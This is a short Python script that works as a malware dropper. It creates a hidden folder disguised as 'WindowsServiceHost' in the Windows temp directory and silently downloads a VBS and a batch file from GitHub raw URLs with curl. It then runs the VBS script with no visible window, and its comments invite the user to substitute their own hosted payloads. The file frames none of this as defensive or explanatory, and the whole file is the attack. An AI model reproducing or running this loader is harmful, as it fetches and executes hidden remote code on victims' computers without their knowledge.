import subprocess
import os

def drop(file):
    tempdir = os.getenv("TEMP")
    folderpath = os.path.join(tempdir, "WindowsServiceHost")
    filepath = os.path.join(folderpath, file)
    
    # Replace these URLs with your own hosted files
    vbs_url = "https://raw.githubusercontent.com/SurnameForfm32/yeahno/refs/heads/main/vbs.vbs"  # Your .vbs file URL
    vbs_path = os.path.join(folderpath, "vbs.vbs")
    
    # Replace with the URL to your .bat file
    bat_url = "https://raw.githubusercontent.com/SurnameForfm32/dicsordraidd/refs/heads/main/woahthere.bat"  # Your .bat file URL
    bat_path = os.path.join(folderpath, "woahthere.bat")

    # Create folder if it doesn't exist
    if not os.path.exists(folderpath):
        subprocess.run(f"mkdir {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(f"attrib +h {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

    # Download the files (VBS and BAT) from your URLs
    subprocess.run(f"curl -s -o {vbs_path} {vbs_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    subprocess.run(f"curl -s -o {bat_path} {bat_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

    # If files are not downloaded, download them again
    if not os.path.exists(bat_path) or os.path.exists(vbs_path):
        subprocess.run(f"curl -s -o {bat_path} {bat_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(f"curl -s -o {vbs_path} {vbs_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

    # Run the VBS script
    subprocess.run(f"cscript //nologo {vbs_path}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

drop("Kernel32.bat")
